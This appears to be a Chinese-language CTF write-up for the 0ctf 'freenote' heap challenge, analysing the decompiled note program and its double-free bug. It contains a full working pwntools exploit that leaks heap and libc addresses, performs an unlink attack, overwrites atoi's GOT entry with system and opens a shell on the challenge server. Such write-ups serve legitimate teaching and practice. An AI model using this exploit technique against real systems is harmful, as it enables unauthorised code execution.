title: 0ctf - freenote
date: 1970-1-1
categories:
- PWN
---

# 整理结构体

- 程序首先初始化了了chunklist,此题的chunklist是在堆里面分配的
- 一个指针指向了malloc(0x1810)的头,此段空间的前16字节分别是最大堆块的值和当前堆块数量
- 大概结构体如下图

```c
00000000
00000000 headptr         struc ; (sizeof=0x1810, align=0x8, mappedto_6)
00000000 max             dq ?
00000008 count           dq ?
00000010 nodelist        note 256 dup(?)
00001810 headptr         ends
00001810
```

- note结构体如下

```c
00000000 note            struc ; (sizeof=0x18, align=0x8, mappedto_7)
00000000                                         ; XREF: headptr/r
00000000 inuse           dq ?
00000008 size            dq ?
00000010 data            dq ?
00000018 note            ends
00000018
```

- 经过整理以后,可以看出来程序一开始初始化了256个note结构体,指针置空

# 函数分析

## new函数
```c
int new()
{
  __int64 v0; // rax
  void *buf; // ST18_8
  int i; // [rsp+Ch] [rbp-14h]
  int size; // [rsp+10h] [rbp-10h]

  if ( head->count < head->max )
  {
    for ( i = 0; ; ++i )
    {
      v0 = head->max;
      if ( i >= head->max )
        break;
      if ( !head->nodelist[i].inuse )
      {
        printf("Length of new note: ");
        size = retint();
        if ( size > 0 )
        {
          if ( size > 4096 )
            size = 4096;
          buf = malloc((128 - size % 128) size);
          printf("Enter your note: ");
          mread1(buf, size);
          head->nodelist[i].inuse = 1LL;
          head->nodelist[i].size = size;
          head->nodelist[i].data = buf;
          ++head->count;
          LODWORD(v0) = puts("Done.");
        }
        else
        {
          LODWORD(v0) = puts("Invalid length!");
        }
        return v0;
      }
    }
  }
  else
  {
    LODWORD(v0) = puts("Unable to create new note.");
  }
  return v0;
}
```

- 整理过结构体以后,程序逻辑就很清晰了,new函数是从前到后遍历chunklist,当inuse为0的时候,在那个堆块malloc了note的空间,注意的是,size是不可任意malloc的,因为设置了自动对齐的运算,size大小只能是128*n (n > 0)
- 这就导致了我们无法直接申请fastbin
- 还有程序自己实现了read函数,输入size后必须输入满足你的size才能结束输入循环

## list函数

```c
int list()
{
  __int64 v0; // rax
  unsigned int i; // [rsp+Ch] [rbp-4h]

  if ( head->count <= 0 )
  {
    LODWORD(v0) = puts("You need to create some new notes first.");
  }
  else
  {
    for ( i = 0; ; ++i )
    {
      v0 = head->max;
      if ( i >= head->max )
        break;
      if ( head->nodelist[i].inuse == 1 )
        printf("%d. %s\n", i, head->nodelist[i].data);
    }
  }
  return v0;
}
```

- 打印当前所有inuse为1的堆块

## edit函数
```c
int edit()
{
  headptr *v1; // rbx
  int v2; // [rsp+4h] [rbp-1Ch]
  int v3; // [rsp+8h] [rbp-18h]

  printf("Note number: ");
  v3 = retint();
  if ( v3 < 0 || v3 >= head->max || head->nodelist[v3].inuse != 1 )
    return puts("Invalid number!");
  printf("Length of note: ");
  v2 = retint();
  if ( v2 <= 0 )
    return puts("Invalid length!");
  if ( v2 > 4096 )
    v2 = 4096;
  if ( v2 != head->nodelist[v3].size )
  {
    v1 = head;
    v1->nodelist[v3].data = realloc(head->nodelist[v3].data, (128 - v2 % 128) v2);// 0 128 256
    head->nodelist[v3].size = v2;
  }
  printf("Enter your note: ");
  mread1(head->nodelist[v3].data, v2);
  return puts("Done.");
}
```

- 这个edit函数并没有限制编辑的次数,而且要注意的是,当size不一样的时候,程序会调用realloc函数

## del函数

```c
int del()
{
  int v1; // [rsp+Ch] [rbp-4h]

  if ( head->count <= 0 )
    return puts("No notes yet.");
  printf("Note number: ");
  v1 = retint();
  if ( v1 < 0 || v1 >= head->max )
    return puts("Invalid number!");
  --head->count;
  head->nodelist[v1].inuse = 0LL;               // 未check是否inuse 任意次数free
  head->nodelist[v1].size = 0LL;
  free(head->nodelist[v1].data);
  return puts("Done.");
}
```

- 最短的函数之一,也是漏洞点的所在
- 程序并没有check堆块是否inuse,而且free后指针没有置空,所以就导致了我们可以通过double free来进行攻击
  
# 攻击过程

- 要进行攻击,必须获得程序中的一些基址,也就是在程序真正运行时的一些偏移,这里可以采用unsorted bin leak来leaklibc的基址,同样我们利用free后再次malloc,也可以获得上次相同的堆块,随后我们可以利用形成的双链表的fd bk来获取libc和heap的基址
- 由于程序中并没有溢出的存在,又不能生成fastbin,这里考虑从堆块错位下手,然后利用未置空的指针来进行double free
- 具体过程是先leak堆和libc的基址,然后全部free后,malloc4块空间依次free,随后申请一个大的堆块,正好包含起来所有的小堆块,构造unlink后随后free之前修改过的指针的已free堆块,控制指针,随后getshell

# exp

- 首先add四个堆块,然后依次free index为0和2的堆块,0处就会出现main_arena的真实地址,我们获得了libc基址,2处因为无法合并就会出现双向链表,同样泄露了heap的地址
- 全部free后,利用堆块错位和double free构造unlink
- 三次malloc(128)以后内存依次free后内存中应该是下面的样子
  
```
-----+--------------------
0x00 | head   size
0x10 | data   data
.... | data   data
0x80 | data   data
-----+--------------------
0x90 | head   size
0xa0 | data   data
.... | data   data
0x110| data   data
-----+--------------------
0x120| head   size
0x130| data   data
.... | data   data
0x1a0| data   data
--------------------------
```

- 之后编辑堆块构造unlink
- 放出完整exp

```python
from pwn import *


r = remote("pwn2.jarvisoj.com",9886)
# r = process("./freenote_x64",env={'LD_PRELOAD':'./libc-2.19.so'})
got_atoi = 0x602070
libc_mainarena = 0x3BE760
libc_system = 0x46590

def show():
    r.sendlineafter("choice: ","1")

def new(text):
    r.sendlineafter("choice: ","2")
    r.sendlineafter("new note: ",str(len(text)))
    r.sendafter("your note: ",text)

def edit(index,text):
    r.sendlineafter("choice: ","3")
    r.sendlineafter("Note number: ",str(index))
    r.sendlineafter("Length of note: ",str(len(text)))
    r.sendafter("your note: ",text)

def free(index):
    r.sendlineafter("choice: ","4")
    r.sendlineafter("Note number: ",str(index))

def exp():
    #leak
    print "start"
    new("1")
    new("2")
    new("3")
    new("4")
    free(0)
    free(2)
    new("aaaaaaaa")
    new("aaaaaaaa")
    show()
    r.recv(11)
    s = r.recv(4)
    heap_base = u64(s+'\x00'*4)
    print "heap_base : 0x%x"%heap_base
    r.recv(17)
    s = r.recv(6)
    main_arena = u64(s+'\x00'*2)
    print "mainarena : 0x%x"%main_arena
    chunklist0 = heap_base - 0x1910
    #del
    free(0)
    free(1)
    free(2)
    free(3)

    #unlink
    new("1")
    new("2")
    new("3")

    free(0)
    free(1)
    free(2)
    payload = ""
    payload += "a"*8 + p64(0x81)
    payload += p64(chunklist0-0x18) + p64(chunklist0-0x10)
    payload += p64(0x0) * 2 * 6
    payload += p64(0x80) + p64(0x90)
    payload += p64(0x0) * 2 * 8
    payload += "a"*8 + p64(0x91)
    new(payload)
    free(1)   #unlink  ptr[0] -> &ptr[0] - 0x18
    #attack
    libc_base = main_arena - 88 - libc_mainarena
    print "libc_base : 0x%x"%libc_base
    system = libc_base + libc_system
    print "sytem_add : 0x%x"%system
    #getshell
    payload1 = p64(0x1) + p64(0x1)
    payload1 += p64(0x120) + p64(chunklist0-0x18)
    payload1 += p64(0x1) + p64(8) + p64(got_atoi)
    payload1 += p64(0)*2 * 14 + p64(0)
    print hex(len(payload1))
    edit(0,payload1)
    edit(1,p64(system))
    r.sendline("/bin/sh")
    r.interactive()


if __name__=="__main__":
    exp()
```
> Your choice: \$ ls
\$ ls
flag
freenote_x64
$ cat flag
CTF{de7effd8864**********c}

